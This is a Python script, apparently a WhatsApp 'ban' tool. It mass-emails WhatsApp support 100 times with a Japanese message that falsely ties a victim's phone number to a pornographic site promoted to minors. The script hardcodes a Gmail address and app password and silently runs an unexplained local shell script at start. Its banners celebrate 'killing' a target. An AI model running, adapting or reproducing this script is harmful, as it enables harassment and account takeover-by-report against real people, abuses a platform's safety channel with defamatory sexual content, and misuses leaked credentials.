import smtplib
from email.mime.text import MIMEText
import time
import os

os.system("bash whynfx.sh")
print ("WELCOME ANONYMOUS KILL YOUR TARGET !")
EMAIL = "dyrothmvp96@gmail.com"
PASSWORD = "wdix mqoo kvbf ebbb"
TO_EMAIL = "smb@support.whatsapp.com"

# Minta nomor WA dari terminal
nomor = input("This is Banned Black Hat !(example: 62xxxxx): ")

SUBJECT = "スロット"
BODY = f"""WhatsApp開発者とWhatsAppユーザーの皆さん、こんにちは😘私が提供したいのは 
 ポルノ Web サイトまたは未成年者に非常に人気のあるサイト🫣💦 この Web サイトは、非常にムラムラする可能性があるため、使用するのに非常に適しています 💦💦 このサイトへの参加を許可されている場合は、Amzz Neverlous という名前の私たちのサイトの管理者に連絡してください。 直接開きたい場合は、以下のウェブサイトをクリックしてください💦👇👇
 https://cin.monster/v/334544
 https://cin.monster/v/334544
 https://cin.monster/v/334544

 「こんにちは、私の名前はヴィンセントです。私はこのポルノ サイトで服を着ていないアニメを見るのが大好きです😋💦、そして今ウェブ上に非常に優れたポルノ サイトであるアニメ ポルノ サイトがあることを知りました。」未成年者が見るには🥰、エロ漫画を見ているようなものです。私は一日中3回精子を放出しました🤩💦 私はこのサイトがとても気に入っています。友達や未成年者にもこのサイトを見てもらいたいです。彼らの欲望を満たすためにそれを使ってください😋 ありがとう、Amzz Neverlous 🤩❤️🔥」

 これは、私たちのポルノ ウェブサイトの忠実な視聴者のコメントの 1 つです🤤。 ポルノウェブ開発者になりたい、またはポルノウェブサイトを作成したい場合は、以下の連絡先までご連絡ください☎️📞
 https://web.whatsapp/contact?number={nomor}"""

JUMLAH_KIRIM = 100
DELAY = 8

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(EMAIL, PASSWORD)

for i in range(JUMLAH_KIRIM):
    msg = MIMEText(BODY)
    msg['Subject'] = SUBJECT
    msg['From'] = EMAIL
    msg['To'] = TO_EMAIL
    
    server.send_message(msg)
    print(f"[{i+1}] MEMULAI ACCESS CRASH BY WHYNFX {nomor}")
    time.sleep(DELAY)

server.quit()
print("Banned Successfully by BBH, Crazyy Bro....")
